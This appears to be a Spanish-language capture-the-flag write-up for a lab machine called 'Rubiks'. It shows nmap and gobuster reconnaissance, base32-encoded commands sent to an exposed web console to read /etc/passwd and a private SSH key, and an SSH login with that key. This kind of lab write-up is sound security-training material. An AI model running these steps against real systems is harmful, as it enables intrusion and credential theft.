## Máquina Rubiks

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64


### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2

![alt text](image.png)


colocamos el dominio al /etc/hosts


### Fuzzing Web

gobuster dir -t 200 -u http://rubikcube.dl/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html,db,png,jpg,git -b 403,404 2>/dev/null


![alt text](image-1.png)

Entramos en /administration y luego en configuraciones hay un menu que dice consola entré y me arroja un error pero ingresando como /administration/myconsole.php si puedo entrar

Al entrar me dice que puedo ejecutar comandos codificados, la codificación es en base 32, entonces intenté:

echo 'cat /etc/passwd' | base32

MNQXIIBPMV2GGL3QMFZXG53EBI======


root:x:0:0:root:/root:/bin/bash

luisillo:x:1001:1001::/home/luisillo:/bin/sh

Entonces ejecuté:

echo 'ls -la' | base32

NRZSALLMMEFA====

-rwxr-xr-x 1 root root 3389 Aug 30 03:28 .id_rsa

echo 'cat .id_rsa' | base32 

MNQXIIBONFSF64TTMEFA====

creé un archivo llamado id_rsa copié el id_rsa de la web y le di permisos 600

### Intrusión

Me conecté por ssh con el usuario luisillo y el id_rsa

![alt text](image-2.png)

### Escalar privilegios

![alt text](image-3.png)
